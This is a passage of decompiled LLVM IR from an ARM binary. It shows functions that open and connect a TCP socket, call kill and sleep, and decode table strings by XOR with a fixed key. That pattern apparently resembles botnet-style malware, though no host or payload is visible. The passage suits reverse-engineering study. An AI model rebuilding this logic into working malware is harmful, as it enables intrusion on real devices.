  %v1_113dc = load i32, i32* %lr.global-to-local, align 4
  %v2_113dc = add i32 %v1_113dc, 4
  %v3_113dc = inttoptr i32 %v2_113dc to i32*
  store i32 %v10_113bc, i32* %v3_113dc, align 4
  %v0_113e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_113e0 = trunc i32 %v0_113e0 to i8
  %v2_113e0 = load i32, i32* %lr.global-to-local, align 4
  %v3_113e0 = inttoptr i32 %v2_113e0 to i8*
  store i8 %v1_113e0, i8* %v3_113e0, align 1
  %v0_113e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_113e4 = add i32 %v0_113e4, 9
  %v2_113e4 = inttoptr i32 %v1_113e4 to i8*
  %v3_113e4 = load i8, i8* %v2_113e4, align 1
  %v4_113e4 = zext i8 %v3_113e4 to i32
  store i32 %v4_113e4, i32* %r0.global-to-local, align 4
  %v1_113e8 = add i32 %v0_113e4, 8
  %v2_113e8 = inttoptr i32 %v1_113e8 to i8*
  %v3_113e8 = load i8, i8* %v2_113e8, align 1
  %v4_113e8 = zext i8 %v3_113e8 to i32
  store i32 %v4_113e8, i32* %r1.global-to-local, align 4
  %v0_11400.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_11228.pre.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_113ec

dec_label_pc_113ec:                               ; preds = %dec_label_pc_11358, %dec_label_pc_1137c
  %v0_11228.pre.pre = phi i32 [ %v3_11234153, %dec_label_pc_11358 ], [ %v0_11228.pre.pre.pre, %dec_label_pc_1137c ]
  %v0_11400 = phi i32 [ %v1_112a4, %dec_label_pc_11358 ], [ %v0_11400.pre, %dec_label_pc_1137c ]
  %v1_113ec = phi i32 [ %v4_1135c, %dec_label_pc_11358 ], [ %v4_113e4, %dec_label_pc_1137c ]
  %v0_113ec = phi i32 [ %v4_11358, %dec_label_pc_11358 ], [ %v4_113e8, %dec_label_pc_1137c ]
  %v4_113ec = mul nuw nsw i32 %v1_113ec, 256
  %v5_113ec = or i32 %v4_113ec, %v0_113ec
  %v3_113f0 = mul i32 %v5_113ec, 65536
  store i32 %v3_113f0, i32* %r2.global-to-local, align 4
  %tmp133 = mul nuw nsw i32 %v0_113ec, 256
  %v5_113fc = or i32 %tmp133, %v1_113ec
  store i32 %v5_113fc, i32* %r3.global-to-local, align 4
  %v2_11400 = add i32 %v5_113fc, %v0_11400
  br label %dec_label_pc_11228.backedge

; uselistorder directives
  uselistorder i32 %v1_113ec, { 1, 0 }
  uselistorder i32 %v3_113c8, { 1, 0, 2 }
  uselistorder i32 %v10_113bc, { 1, 0, 2 }
  uselistorder i32 %v4_1135c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_11358, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1133c, { 1, 0 }
  uselistorder i32 %v3_112b8, { 0, 2, 1 }
  uselistorder i32 %v1_1133c64, { 1, 0 }
  uselistorder i32 %v1_11338, { 1, 2, 0 }
  uselistorder i32 %v2_1132c, { 1, 0 }
  uselistorder i32 %v3_11248, { 0, 2, 1 }
  uselistorder i32 %v1_1132c49, { 1, 0 }
  uselistorder i32 %v1_11328, { 1, 2, 0 }
  uselistorder i1 %v7_11230, { 1, 0 }
  uselistorder i32 %v1_11228, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v3_112e4, { 0, 2, 1 }
  uselistorder i32 %v2_112e0, { 1, 2, 0 }
  uselistorder i32 %v0_11334, { 2, 0, 1 }
  uselistorder i32 %v1_1133c, { 1, 2, 0 }
  uselistorder i32 %v3_112c027, { 1, 0 }
  uselistorder i32 %v3_112b825, { 1, 0, 2 }
  uselistorder i32 %v1_112a4, { 2, 3, 1, 0, 5, 4, 6 }
  uselistorder i32 %v2_11290, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_11274, { 0, 2, 1 }
  uselistorder i32 %v2_11270, { 1, 2, 0 }
  uselistorder i32 %v0_11324, { 2, 0, 1 }
  uselistorder i32 %v1_1132c, { 1, 2, 0 }
  uselistorder i32 %v3_1125021, { 1, 0 }
  uselistorder i32 %v3_1124819, { 1, 0, 2 }
  uselistorder i32 %v0_11290152, { 3, 0, 1, 2 }
  uselistorder i32 %v3_11234151, { 1, 0 }
  uselistorder i1 %v7_11230150, { 1, 0 }
  uselistorder i32 %v1_11228143, { 1, 0 }
  uselistorder i32 %v4_11210, { 1, 0, 2 }
  uselistorder i32 %v0_11194, { 1, 0 }
  uselistorder i32 %v0_1116c, { 1, 0 }
  uselistorder i1 %v7_11120, { 1, 0 }
  uselistorder i32 %v5_1111c, { 1, 0, 2 }
  uselistorder i32 %v1_110e0, { 1, 0 }
  uselistorder i32 %v3_110cc, { 1, 0 }
  uselistorder i32 %v0_110c4, { 1, 0 }
  uselistorder i32 %v1_110b8, { 1, 2, 0 }
  uselistorder i1 %v7_11084, { 1, 0 }
  uselistorder i32 %v4_11080, { 1, 0, 2 }
  uselistorder i1 %v7_11068, { 1, 0 }
  uselistorder i32 %v3_11064, { 1, 0, 2 }
  uselistorder i1 %v7_1104c, { 1, 0 }
  uselistorder i32 %v3_11048, { 2, 1, 0, 3 }
  uselistorder i1 %v7_11030, { 2, 1, 0 }
  uselistorder i32 %v1_11034, { 1, 0 }
  uselistorder i32 %v1_111d4, { 1, 2, 0 }
  uselistorder i32 %v2_110d0, { 1, 0, 2 }
  uselistorder i32 %v2_1102c, { 1, 0, 2 }
  uselistorder i32 %v2_10ff4, { 4, 3, 2, 5, 7, 10, 9, 1, 0, 6, 8, 11 }
  uselistorder i32 %v4_10fa8, { 3, 0, 2, 1 }
  uselistorder i32 %v2_10f9c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10f74, { 1, 0, 2 }
  uselistorder i32 %v0_10f30, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10f2c, { 1, 0, 2 }
  uselistorder i32 %v1_10f28, { 1, 0 }
  uselistorder i32 %v2_10f1c11, { 1, 0 }
  uselistorder i32 %v2_10f1c, { 1, 0 }
  uselistorder i1 %v8_10f0c, { 1, 0 }
  uselistorder i32 %v2_10ef4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_10eec, { 1, 0 }
  uselistorder i32 %v0_10edc, { 1, 0 }
  uselistorder i32 %v2_10ed4, { 2, 3, 4, 5, 6, 0, 1, 7, 8 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-2240, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i8* %stack_var_-4288, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 1, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 9, 7, 10, 11, 13, 14, 15, 16, 12, 17, 19, 18, 20 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 10, 13, 11, 12, 14, 16, 33, 17, 18, 19, 20, 21, 25, 22, 23, 24, 26, 34, 35, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 11, 7, 30, 9, 10, 29, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 27, 25, 26, 28 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 11, 6, 7, 25, 9, 10, 24, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 26, 21, 27, 23 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 7, 46, 8, 9, 10, 13, 12, 16, 15, 14, 18, 17, 21, 19, 20, 22, 24, 23, 26, 25, 27, 29, 28, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 8, 2, 13, 3, 4, 14, 5, 6, 7, 34, 9, 10, 11, 12, 33, 36, 15, 16, 17, 18, 19, 20, 21, 22, 23, 35, 24, 25, 26, 27, 32, 30, 28, 29, 31, 37 }
  uselistorder void (i32*)* @free, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @_sleep, { 8, 7, 11, 10, 9, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 53, { 1, 0, 2 }
  uselistorder i8 46, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder label %dec_label_pc_113ec, { 1, 0 }
  uselistorder label %dec_label_pc_112b8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_11248.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_11228.backedge, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_112c8, { 1, 0 }
  uselistorder label %dec_label_pc_112c8.preheader, { 1, 0 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %dec_label_pc_11258, { 1, 0 }
  uselistorder label %dec_label_pc_11258.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1123c, { 1, 0 }
  uselistorder label %dec_label_pc_111b4, { 1, 0 }
  uselistorder label %dec_label_pc_1119c, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1117c, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_110b4.dec_label_pc_110b4_crit_edge, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10f04, { 1, 0 }
}

define i32 @function_11408(i32 %arg1) local_unnamed_addr {
dec_label_pc_11408:
  %v0_11414 = call i32 @_kill()
  %v0_11418 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11418, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_11408
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_11408, %bb
  ret i32 %v0_11414

; uselistorder directives
  uselistorder i32 ()* @_kill, { 15, 13, 12, 11, 10, 9, 14, 2, 1, 0, 8, 7, 6, 5, 4, 3, 16 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_1141c() local_unnamed_addr {
dec_label_pc_1141c:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1141c = load i32, i32* @r4, align 4
  store i32 %v3_1141c, i32* %stack_var_-16, align 4
  %v0_11420 = load i32, i32* @r0, align 4
  store i32 %v0_11420, i32* %r5.global-to-local, align 4
  %v1_11424 = add i32 %v0_11420, 4
  %v2_11424 = inttoptr i32 %v1_11424 to i32*
  %v3_11424 = load i32, i32* %v2_11424, align 4
  store i32 %v3_11424, i32* %r0.global-to-local, align 4
  %v2_11428 = ptrtoint i32* %stack_var_-32 to i32
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v1_11444 = icmp ne i32 %v3_11424, -1
  call void @__pseudo_cond_branch(i1 %v1_11444, i32 ptrtoint (i32* @global_var_8dcc.81 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_11454 = call i32 @_socket(i32 2, i32 1, i32 0)
  store i32 %v3_11454, i32* %r3.global-to-local, align 4
  %v7_1145c = icmp eq i32 %v3_11454, -1
  %v0_11464 = load i32, i32* %r5.global-to-local, align 4
  %v1_11464 = add i32 %v0_11464, 28
  store i32 %v1_11464, i32* %r0.global-to-local, align 4
  %v2_11468 = add i32 %v0_11464, 4
  %v3_11468 = inttoptr i32 %v2_11468 to i32*
  store i32 %v3_11454, i32* %v3_11468, align 4
  br i1 %v7_1145c, label %dec_label_pc_1141c.dec_label_pc_114e4_crit_edge, label %dec_label_pc_11470

dec_label_pc_1141c.dec_label_pc_114e4_crit_edge:  ; preds = %dec_label_pc_1141c
  %v14_114e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_114e4

dec_label_pc_11470:                               ; preds = %dec_label_pc_1141c
  %v0_11470 = load i32, i32* %r6.global-to-local, align 4
  %v1_11470 = load i32, i32* %r5.global-to-local, align 4
  %v2_11470 = add i32 %v1_11470, 24
  %v3_11470 = inttoptr i32 %v2_11470 to i32*
  store i32 %v0_11470, i32* %v3_11470, align 4
  %v0_11474 = load i32, i32* %r0.global-to-local, align 4
  %v2_11474 = call i32 @function_13af4(i32 %v0_11474, i32 256)
  store i32 %v2_11474, i32* %r0.global-to-local, align 4
  %v0_11478 = load i32, i32* %r5.global-to-local, align 4
  %v1_11478 = add i32 %v0_11478, 4
  %v2_11478 = inttoptr i32 %v1_11478 to i32*
  %v3_11478 = load i32, i32* %v2_11478, align 4
  store i32 %v3_11478, i32* %r0.global-to-local, align 4
  %v2_11488 = call i32 (i32, i32, ...) @fcntl(i32 %v3_11478, i32 3)
  store i32 %v3_11478, i32* %r0.global-to-local, align 4
  %v2_11498 = call i32 (i32, i32, ...) @fcntl(i32 %v3_11478, i32 4)
  store i32 %v2_11498, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdf0.240 to i32), i32* %r3.global-to-local, align 4
  %v0_114a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_114a4 = load i32, i32* @global_var_1cdf0.240, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_114b0 = add i32 %v0_114a0, 8
  %v3_114b0 = inttoptr i32 %v2_114b0 to i32*
  store i32 %v2_114a4, i32* %v3_114b0, align 4
  %v0_114b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_114b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_114b4 = add i32 %v1_114b4, 12
  %v3_114b4 = inttoptr i32 %v2_114b4 to i32*
  store i32 %v0_114b4, i32* %v3_114b4, align 4
  %v0_114bc = load i32, i32* %r5.global-to-local, align 4
  %v1_114bc = add i32 %v0_114bc, 4
  %v2_114bc = inttoptr i32 %v1_114bc to i32*
  %v3_114bc = load i32, i32* %v2_114bc, align 4
  store i32 %v3_114bc, i32* @r0, align 4
  %v0_114c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_114c0 = mul i32 %v0_114c0, 2
  store i32 %v2_114c0, i32* %r3.global-to-local, align 4
  store i32 %v2_11428, i32* @r1, align 4
  store i32 %v2_114c0, i32* %stack_var_-32, align 4
  %v3_114e0 = call i32 @_connect(i32 %v3_114bc, i32 %v2_11428, i32 16)
  store i32 %v3_114e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_114e4

dec_label_pc_114e4:                               ; preds = %dec_label_pc_1141c.dec_label_pc_114e4_crit_edge, %dec_label_pc_11470
  %v14_114e8 = phi i32 [ %v14_114e8.pre, %dec_label_pc_1141c.dec_label_pc_114e4_crit_edge ], [ %v3_114e0, %dec_label_pc_11470 ]
  %v2_114e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_114e8, i32* @r4, align 4
  ret i32 %v14_114e8

; uselistorder directives
  uselistorder i32 %v2_114c0, { 1, 0 }
  uselistorder i32 %v3_11478, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11454, { 1, 0, 2 }
  uselistorder i32 %v2_11428, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 7, 4, 5, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @function_13af4, { 7, 12, 16, 15, 14, 13, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 5, 2, 3, 4, 0, 1, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_114e4, { 1, 0 }
}

define i32 @function_114f0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_114f0:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1cdbc.242 to i32), i32* %r8.global-to-local, align 4
  %v2_114f8 = load i32, i32* @global_var_1cdbc.242, align 4
  store i32 ptrtoint (i32* @global_var_1cde8.244 to i32), i32* %sb.global-to-local, align 4
  %v3_11504 = mul i32 %v2_114f8, 16
  store i32 %v3_11504, i32* %r3.global-to-local, align 4
  %v3_1150c = urem i32 %arg3, 65536
  store i32 %v3_1150c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_11518 = load i32, i32* @global_var_1cde8.244, align 4
  %v1_1151c = add i32 %v3_11504, 16
  store i32 %v1_1151c, i32* %r1.global-to-local, align 4
  store i32 %v3_1150c, i32* %stack_var_-44, align 4
  %v8_11524 = inttoptr i32 %v2_11518 to i32*
  %v9_11524 = call i32* @realloc(i32* %v8_11524, i32 %v1_1151c)
  %v11_11524 = ptrtoint i32* %v9_11524 to i32
  store i32 %v11_11524, i32* %sl.global-to-local, align 4
  %v0_1152c = load i32, i32* %r5.global-to-local, align 4
  %v1_11530 = load i32, i32* %sb.global-to-local, align 4
  %v2_11530 = inttoptr i32 %v1_11530 to i32*
  store i32 %v11_11524, i32* %v2_11530, align 4
  %v2_11534 = load i32, i32* @global_var_1cdbc.242, align 4
  store i32 %v2_11534, i32* %fp.global-to-local, align 4
  %v1_11538 = inttoptr i32 %v0_1152c to i8*
  %v2_11538 = call i32 @function_13a54(i8* %v1_11538)
  %sext = mul i32 %v2_11538, 16777216
  %v1_1153c = sdiv i32 %sext, 16777216
  %v2_1153c = add nsw i32 %v1_1153c, 1
  store i32 %v1_1153c, i32* %r7.global-to-local, align 4
  %v1_11548 = call i32 @_malloc(i32 %v2_1153c)
  %v0_1154c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1154c, i32* %r1.global-to-local, align 4
  store i32 %v2_1153c, i32* %r2.global-to-local, align 4
  store i32 %v1_11548, i32* %r6.global-to-local, align 4
  %v3_11558 = call i32 @function_13ad0(i32 %v1_11548, i32 %v0_1154c, i32 %v2_1153c)
  %v0_1155c = load i32, i32* %r7.global-to-local, align 4
  %tmp21 = icmp slt i32 %v0_1155c, 1
  %extract.t6 = trunc i32 %v0_1155c to i8
  br i1 %tmp21, label %dec_label_pc_11580, label %dec_label_pc_11564

dec_label_pc_11564:                               ; preds = %dec_label_pc_114f0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11568

dec_label_pc_11568:                               ; preds = %dec_label_pc_11568, %dec_label_pc_11564
  %v2_11570 = phi i32 [ %v1_11574, %dec_label_pc_11568 ], [ 0, %dec_label_pc_11564 ]
  %v1_11568 = load i32, i32* %r6.global-to-local, align 4
  %v2_11568 = add i32 %v1_11568, %v2_11570
  %v3_11568 = inttoptr i32 %v2_11568 to i8*
  %v4_11568 = load i8, i8* %v3_11568, align 1
  %v6_11568 = zext i8 %v4_11568 to i32
  %v1_1156c = xor i32 %v6_11568, 34
  store i32 %v1_1156c, i32* %r3.global-to-local, align 4
  %v1_11570 = trunc i32 %v1_1156c to i8
  store i8 %v1_11570, i8* %v3_11568, align 1
  %v0_11574 = load i32, i32* %r2.global-to-local, align 4
  %v1_11574 = add i32 %v0_11574, 1
  store i32 %v1_11574, i32* %r2.global-to-local, align 4
  %v0_11578 = load i32, i32* %r7.global-to-local, align 4
  %v9_11578 = icmp eq i32 %v0_11578, %v1_11574
  br i1 %v9_11578, label %dec_label_pc_11580.loopexit, label %dec_label_pc_11568

dec_label_pc_11580.loopexit:                      ; preds = %dec_label_pc_11568
  %extract.t = trunc i32 %v1_11574 to i8
  br label %dec_label_pc_11580

dec_label_pc_11580:                               ; preds = %dec_label_pc_11580.loopexit, %dec_label_pc_114f0
  %v0_11590.off0 = phi i8 [ %extract.t, %dec_label_pc_11580.loopexit ], [ %extract.t6, %dec_label_pc_114f0 ]
  %v2_11580 = load i32, i32* @global_var_1cdbc.242, align 4
  %v2_11584 = load i32, i32* @global_var_1cde8.244, align 4
  store i32 %v2_11584, i32* %r2.global-to-local, align 4
  %v3_11588 = mul i32 %v2_11580, 16
  %v2_1158c = add i32 %v2_11584, %v3_11588
  store i32 %v2_1158c, i32* %r3.global-to-local, align 4
  %v3_11590 = add i32 %v2_1158c, 12
  %v4_11590 = inttoptr i32 %v3_11590 to i8*
  store i8 %v0_11590.off0, i8* %v4_11590, align 1
  %v0_11594 = load i32, i32* %r6.global-to-local, align 4
  %v1_11594 = load i32, i32* %sl.global-to-local, align 4
  %v2_11594 = load i32, i32* %fp.global-to-local, align 4
  %v5_11594 = mul i32 %v2_11594, 16
  %v6_11594 = add i32 %v5_11594, %v1_11594
  %v7_11594 = inttoptr i32 %v6_11594 to i32*
  store i32 %v0_11594, i32* %v7_11594, align 4
  %v2_1159c = load i32, i32* @global_var_1cdbc.242, align 4
  store i32 %v2_1159c, i32* %r7.global-to-local, align 4
  %v2_115a0 = load i32, i32* @global_var_1cde8.244, align 4
  store i32 %v2_115a0, i32* %sl.global-to-local, align 4
  %v1_115a4 = inttoptr i32 %arg2 to i8*
  %v2_115a4 = call i32 @function_13a54(i8* %v1_115a4)
  %sext1 = mul i32 %v2_115a4, 16777216
  %v1_115a8 = sdiv i32 %sext1, 16777216
  %v2_115a8 = add nsw i32 %v1_115a8, 1
  store i32 %v1_115a8, i32* %r5.global-to-local, align 4
  %v1_115b4 = call i32 @_malloc(i32 %v2_115a8)
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %v2_115a8, i32* %r2.global-to-local, align 4
  store i32 %v1_115b4, i32* %r6.global-to-local, align 4
  %v3_115c4 = call i32 @function_13ad0(i32 %v1_115b4, i32 %arg2, i32 %v2_115a8)
  %tmp22 = icmp slt i32 %sext1, 16777216
  %extract.t8 = trunc i32 %v1_115a8 to i8
  br i1 %tmp22, label %dec_label_pc_115ec, label %dec_label_pc_115d0

dec_label_pc_115d0:                               ; preds = %dec_label_pc_11580
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %dec_label_pc_115d4, %dec_label_pc_115d0
  %v2_115dc = phi i32 [ %v1_115e0, %dec_label_pc_115d4 ], [ 0, %dec_label_pc_115d0 ]
  %v1_115d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_115d4 = add i32 %v1_115d4, %v2_115dc
  %v3_115d4 = inttoptr i32 %v2_115d4 to i8*
  %v4_115d4 = load i8, i8* %v3_115d4, align 1
  %v6_115d4 = zext i8 %v4_115d4 to i32
  %v1_115d8 = xor i32 %v6_115d4, 34
  store i32 %v1_115d8, i32* %r3.global-to-local, align 4
  %v1_115dc = trunc i32 %v1_115d8 to i8
  store i8 %v1_115dc, i8* %v3_115d4, align 1
  %v0_115e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_115e0 = add i32 %v0_115e0, 1
  store i32 %v1_115e0, i32* %r2.global-to-local, align 4
  %v0_115e4 = load i32, i32* %r5.global-to-local, align 4
  %v9_115e4 = icmp eq i32 %v0_115e4, %v1_115e0
  br i1 %v9_115e4, label %dec_label_pc_115ec.loopexit, label %dec_label_pc_115d4

dec_label_pc_115ec.loopexit:                      ; preds = %dec_label_pc_115d4
  %extract.t7 = trunc i32 %v1_115e0 to i8
  br label %dec_label_pc_115ec

dec_label_pc_115ec:                               ; preds = %dec_label_pc_115ec.loopexit, %dec_label_pc_11580
  %v0_115fc.off0 = phi i8 [ %extract.t7, %dec_label_pc_115ec.loopexit ], [ %extract.t8, %dec_label_pc_11580 ]
  %v2_115ec = load i32, i32* @global_var_1cdbc.242, align 4
  %v2_115f0 = load i32, i32* @global_var_1cde8.244, align 4
  %v3_115f4 = mul i32 %v2_115ec, 16
  %v2_115f8 = or i32 %v3_115f4, 13
  %v3_115fc = add i32 %v2_115f8, %v2_115f0
  %v4_115fc = inttoptr i32 %v3_115fc to i8*
  store i8 %v0_115fc.off0, i8* %v4_115fc, align 1
  %v2_11604 = load i32, i32* @global_var_1cdbc.242, align 4
  store i32 %v2_11604, i32* %lr.global-to-local, align 4
  %v4_11608 = load i8, i8* @global_var_1cded.247, align 1
  %v5_11608 = zext i8 %v4_11608 to i32
  %v3_1160c = load i8, i8* bitcast (i8** @global_var_1cdec.246 to i8*), align 4
  %v4_1160c = zext i8 %v3_1160c to i32
  %v2_11610 = load i32, i32* @global_var_1cde8.244, align 4
  %v4_11614 = mul nuw nsw i32 %v5_11608, 256
  %v5_11614 = or i32 %v4_1160c, %v4_11614
  store i32 %v5_11614, i32* %r2.global-to-local, align 4
  %v3_11618 = mul i32 %v2_11604, 16
  %v2_1161c = add i32 %v2_11610, %v3_11618
  store i32 %v2_1161c, i32* %r1.global-to-local, align 4
  %v3_11624 = add i32 %v2_1161c, 9
  %v4_11624 = inttoptr i32 %v3_11624 to i8*
  store i8 %v4_11608, i8* %v4_11624, align 1
  %v0_11628 = load i32, i32* %r2.global-to-local, align 4
  %v1_11628 = trunc i32 %v0_11628 to i8
  %v2_11628 = load i32, i32* %r1.global-to-local, align 4
  %v3_11628 = add i32 %v2_11628, 8
  %v4_11628 = inttoptr i32 %v3_11628 to i8*
  store i8 %v1_11628, i8* %v4_11628, align 1
  %v4_1162c = load i8, i8* @global_var_1cded.247, align 1
  %v5_1162c = zext i8 %v4_1162c to i32
  %v3_11630 = load i8, i8* bitcast (i8** @global_var_1cdec.246 to i8*), align 4
  %v4_11630 = zext i8 %v3_11630 to i32
  %v4_11634 = mul nuw nsw i32 %v5_1162c, 256
  %v5_11634 = or i32 %v4_11630, %v4_11634
  %v2_11638 = load i32, i32* %stack_var_-44, align 4
  %v2_1163c = add i32 %v5_11634, %v2_11638
  store i32 %v2_1163c, i32* %r3.global-to-local, align 4
  %v3_116409 = udiv i32 %v2_1163c, 256
  %v1_11644 = trunc i32 %v3_116409 to i8
  %v2_11644 = load i32, i32* %r1.global-to-local, align 4
  %v3_11644 = add i32 %v2_11644, 11
  %v4_11644 = inttoptr i32 %v3_11644 to i8*
  store i8 %v1_11644, i8* %v4_11644, align 1
  %v0_11648 = load i32, i32* %r3.global-to-local, align 4
  %v1_11648 = trunc i32 %v0_11648 to i8
  %v2_11648 = load i32, i32* %r1.global-to-local, align 4
  %v3_11648 = add i32 %v2_11648, 10
  %v4_11648 = inttoptr i32 %v3_11648 to i8*
  store i8 %v1_11648, i8* %v4_11648, align 1
  %v4_1164c = load i8, i8* @global_var_1cded.247, align 1
  %v5_1164c = zext i8 %v4_1164c to i32
  %v3_11650 = load i8, i8* bitcast (i8** @global_var_1cdec.246 to i8*), align 4
  %v4_11650 = zext i8 %v3_11650 to i32
  %v4_11654 = mul nuw nsw i32 %v5_1164c, 256
  %v5_11654 = or i32 %v4_11650, %v4_11654
  %v2_11658 = load i32, i32* %stack_var_-44, align 4
  %v2_1165c = add i32 %v5_11654, %v2_11658
  store i32 %v2_1165c, i32* %r2.global-to-local, align 4
  %v0_11660 = load i32, i32* %r7.global-to-local, align 4
  %v3_11660 = mul i32 %v0_11660, 16
  %v1_11664 = load i32, i32* %sl.global-to-local, align 4
  %v2_11664 = add i32 %v1_11664, %v3_11660
  store i32 %v2_11664, i32* %r3.global-to-local, align 4
  %v0_11668 = load i32, i32* %lr.global-to-local, align 4
  %v1_11668 = add i32 %v0_11668, 1
  store i32 %v1_11668, i32* %lr.global-to-local, align 4
  %v3_1166c = sdiv i32 %v2_1165c, 256
  store i32 %v3_1166c, i32* %r1.global-to-local, align 4
  %v0_11670 = load i32, i32* %r6.global-to-local, align 4
  %v2_11670 = add i32 %v2_11664, 4
  %v3_11670 = inttoptr i32 %v2_11670 to i32*
  store i32 %v0_11670, i32* %v3_11670, align 4
  %v0_11674 = load i32, i32* %lr.global-to-local, align 4
  %v1_11674 = load i32, i32* %r8.global-to-local, align 4
  %v2_11674 = inttoptr i32 %v1_11674 to i32*
  store i32 %v0_11674, i32* %v2_11674, align 4
  %v0_11678 = load i32, i32* %r1.global-to-local, align 4
  %v1_11678 = trunc i32 %v0_11678 to i8
  store i8 %v1_11678, i8* @global_var_1cded.247, align 1
  %v0_1167c = load i32, i32* %r2.global-to-local, align 4
  %v1_1167c = trunc i32 %v0_1167c to i8
  store i8 %v1_1167c, i8* bitcast (i8** @global_var_1cdec.246 to i8*), align 4
  ret i32 ptrtoint (i8** @global_var_1cdec.246 to i32)

; uselistorder directives
  uselistorder i32 %v1_115e0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_115b4, { 1, 0 }
  uselistorder i32 %v2_115a8, { 1, 0, 2 }
  uselistorder i32 %v1_11574, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11548, { 1, 0 }
  uselistorder i32 %v2_1153c, { 1, 0, 2 }
  uselistorder i32 %v3_1150c, { 1, 0 }
